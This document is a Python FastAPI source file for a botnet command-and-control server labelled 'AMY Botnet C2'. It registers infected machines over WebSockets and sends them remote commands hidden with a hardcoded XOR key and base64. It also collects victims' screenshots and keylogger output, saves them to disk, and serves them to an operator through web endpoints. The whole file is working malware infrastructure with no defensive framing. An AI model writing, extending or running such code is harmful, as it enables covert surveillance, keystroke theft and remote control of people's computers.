from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request
from fastapi.responses import FileResponse, Response
import asyncio
import base64
import os
from datetime import datetime

app = FastAPI(title="AMY Botnet C2 - STABLE")

# Шляхи
current_file_path = os.path.abspath(__file__)
project_root = os.path.dirname(os.path.dirname(current_file_path))
ui_path = os.path.join(project_root, "ui")

os.makedirs("screenshots", exist_ok=True)
os.makedirs("logs", exist_ok=True)

active_bots = {}
bot_responses = {}
last_screenshot_data = {} 

X_KEY = "AMY_2026_SECRET"

def crypt_logic(data: str) -> str:
    key = X_KEY
    return "".join(chr(ord(data[i]) ^ ord(key[i % len(key)])) for i in range(len(data)))

def decrypt(data: str) -> str:
    try:
        decoded = base64.b64decode(data).decode()
        return crypt_logic(decoded)
    except: return None

def encrypt(data: str) -> str:
    res = crypt_logic(data)
    return base64.b64encode(res.encode()).decode()

@app.get("/")
async def read_index():
    return FileResponse(os.path.join(ui_path, "index.html"))

@app.get("/bots")
async def list_bots():
    return {"bots": list(active_bots.keys())}

@app.get("/response/{bot_id}")
async def get_response(bot_id: str):
    res = bot_responses.pop(bot_id, "")
    if res == "SCREENSHOT_LOADED":
        return {"response": "IMAGE_READY", "is_img": True}
    return {"response": res, "is_img": False}

@app.get("/view_screenshot/{bot_id}")
async def view_screenshot(bot_id: str):
    data = last_screenshot_data.get(bot_id)
    if data:
        return Response(content=data, media_type="image/png")
    return Response(status_code=404)

@app.post("/command")
async def send_command(bot_id: str, command: str):
    if bot_id in active_bots:
        bot_responses[bot_id] = "Waiting for bot..." 
        await active_bots[bot_id].send_text(encrypt(command))
        return {"status": "success"}
    return {"status": "error"}

@app.websocket("/ws/{bot_id}")
async def websocket_endpoint(websocket: WebSocket, bot_id: str):
    await websocket.accept()
    active_bots[bot_id] = websocket
    try:
        while True:
            raw = await websocket.receive_text()
            data = decrypt(raw)
            if not data: continue
            
            if data.startswith("SCREENSHOT:"):
                img_bytes = base64.b64decode(data[11:])
                last_screenshot_data[bot_id] = img_bytes
                fname = f"screenshots/{bot_id}_{datetime.now().strftime('%H%M%S')}.png"
                with open(fname, "wb") as f: f.write(img_bytes)
                bot_responses[bot_id] = "SCREENSHOT_LOADED"
            elif data.startswith("KEYLOG:"):
                with open(f"logs/{bot_id}.txt", "a") as f: f.write(data[7:] + "\n")
                bot_responses[bot_id] = "Keylog packet received."
            else:
                bot_responses[bot_id] = data
    except WebSocketDisconnect:
        if bot_id in active_bots: del active_bots[bot_id]
